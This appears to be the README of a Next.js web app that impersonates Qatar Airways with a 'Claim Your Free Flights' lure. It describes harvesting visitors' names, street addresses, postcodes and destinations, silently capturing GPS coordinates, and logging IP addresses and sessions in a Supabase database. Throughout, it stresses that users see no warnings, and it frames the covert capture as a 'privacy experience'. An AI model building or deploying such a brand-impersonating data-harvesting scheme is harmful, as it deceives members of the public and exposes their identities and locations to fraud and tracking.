# Qatar Airways User Tracking System

A comprehensive Next.js application that tracks users through two methods: location access and form submission. The system captures user data seamlessly without showing alarming warnings or error messages.

## 🎯 System Overview

The application implements a dual-tracking approach:

### 1. Location Tracking (Optional)
- Requests location permission when user clicks "Claim Your Free Flights"
- If permission is granted: Captures 100% accurate GPS coordinates
- If permission is denied or unavailable: Silently continues to form page
- **No warnings or error messages are shown to users**

### 2. Form Data Collection (Required)
Users must provide the following information:
- **First Name** (required)
- **Last Name** (required) 
- **Postcode** (required)
- **Street Address** (required)
- **City** (optional)
- **Destination** (required)

### 3. User Flow
1. **Landing Page** (`/`) - Beautiful Qatar Airways promotional page
2. **Form Page** (`/success`) - Data collection form with required field validation
3. **Thank You Page** (`/thank-you`) - Professional completion page

## 🚀 Key Features

- **Seamless Location Access**: No error messages if location is denied
- **Smart Form Validation**: Prevents submission without required fields
- **Beautiful UI**: Modern, responsive design with Qatar Airways branding
- **Complete Tracking**: Captures both location and form data in database
- **Professional Experience**: Users see polished thank-you page after submission

## 📱 User Experience

### Positive Flow:
1. User visits landing page
2. Clicks "Claim Your Free Flights"
3. Browser may request location (granted or denied silently)
4. User reaches form page
5. Fills out required information
6. Submits form
7. Sees beautiful thank-you page
8. Auto-redirected after 10 seconds

### No Negative Experiences:
- No location error messages
- No blocked pages for denied permissions
- No confusing technical warnings
- Form works with or without location data

## 🗄️ Database Schema

The system tracks data in several tables:

### form_submissions
- `first_name` (required)
- `last_name` (required)
- `postcode` (required)
- `street_address` (required)
- `city` (optional)
- `destination` (required)
- `latitude` (optional - from GPS)
- `longitude` (optional - from GPS)
- `timestamp`, `user_agent`, `ip_address`, `session_id`

### location_permissions
- Tracks permission requests/grants/denials
- Stores GPS coordinates when available
- Links to user sessions

### Additional tracking tables:
- `page_visits` - Page view analytics
- `user_actions` - User interaction tracking
- `form_interactions` - Form field interactions

## 🛠️ Setup Instructions

### 1. Environment Setup
Create `.env.local` with your Supabase credentials:
```env
NEXT_PUBLIC_SUPABASE_URL=your_supabase_url
NEXT_PUBLIC_SUPABASE_ANON_KEY=your_anon_key
SUPABASE_SERVICE_ROLE_KEY=your_service_role_key
```

### 2. Database Setup
Run the updated database setup:
```bash
node setup-database-updated.js
```

Or manually execute `supabase-schema.sql` in your Supabase dashboard.

### 3. Start Development
```bash
npm install
npm run dev
```

Visit `http://localhost:3000` to test the application.

## 📊 Data Collection Strategy

### Primary Method: Form Submission
Every user who completes the form provides:
- Complete contact information (name, address)
- Travel preferences (destination)
- Location data (postcode + optional GPS coordinates)

### Secondary Method: Location Access
- Attempts to get precise GPS coordinates
- Never blocks users if permission denied
- Silently enhances data when available

### Analytics Tracking
- Page visits and user journey
- Form interaction patterns
- Location permission responses
- Session-based user tracking

## 🔒 Privacy & Security

- Location access is optional and non-blocking
- No personal data exposed in error messages
- Secure database with Row Level Security
- User-friendly privacy experience

## 🎨 Design Features

- **Qatar Airways Branding**: Official colors and styling
- **Responsive Design**: Works on all devices
- **Modern UI**: Clean, professional interface
- **Smooth Animations**: Engaging user experience
- **Form Validation**: Clear field requirements with visual indicators

## 📈 Success Metrics

The system ensures high completion rates by:
- Never blocking users for location denial
- Clear form validation without frustration
- Beautiful success experience
- Professional thank-you messaging

## 🚨 Important Notes

- **No User Warnings**: System never shows location-related errors
- **Form First**: Users can complete entry with form data alone
- **GPS Bonus**: Location data enhances but doesn't replace form data
- **Professional Flow**: Complete experience from landing to thank-you

## 🔧 Troubleshooting

If you encounter issues:

1. **Database Problems**: Run `node setup-database-updated.js`
2. **Location Issues**: System handles gracefully, no action needed
3. **Form Validation**: Check required fields are marked with `*`
4. **Build Errors**: Run `npm run build` to check for issues

## 📝 Additional Files

- `supabase-schema.sql` - Updated database schema
- `setup-database-updated.js` - Automated database setup
- `QUICK_SETUP.md` - Basic setup instructions
- `DATABASE_SETUP.md` - Detailed database instructions

---

This system provides a seamless, professional user experience while capturing comprehensive user data through both location access and form submission methods.
